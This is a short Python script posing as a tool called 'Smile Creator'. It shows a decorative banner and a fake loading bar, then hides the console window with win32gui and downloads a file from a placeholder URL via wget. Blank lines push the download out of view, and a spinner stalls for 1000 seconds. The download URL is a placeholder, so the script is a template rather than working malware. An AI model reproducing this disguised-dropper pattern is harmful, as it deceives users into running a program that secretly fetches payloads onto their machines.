print("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■")
print("■■□□□□□□■■■□□□□□□■■□■■■□■■■■■■■■■■■■■■■■■■■■")
print("■■□■■■■■■■□■■■■■■■■□■■■□■■■■■■■■■■■■■■■■■■■■")
print("■■□□□□□□■■□■■■■■■■■□□□□□■■■■■■■■■■■■■■■■■■■■")
print("■■■■■■■□■■□■■■■■■■■■■■■□■■■■Smile Creator■■■")
print("■■□□□□□□■■■□□□□□□■■■■■■□■■■■■■■Version■■■■■■")
print("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■4.0■■■■■■")
print("■■■■By: Smile LLC 2021■■■■■■■■■■■■■■■■■■■■■■")
print("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■")

#https://smilecreator.tk

import time
import sys
print("Loading files:")


animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

for i in range(len(animation)):
    time.sleep(1)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

print("DONE!")


#close console python
import win32gui, win32con

hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)


import wget
wget.download('url')




















#end code
import itertools
import threading
import time
import sys

done = False
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rRuning <' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

t = threading.Thread(target=animate)
t.start()

time.sleep(1000)
done = True
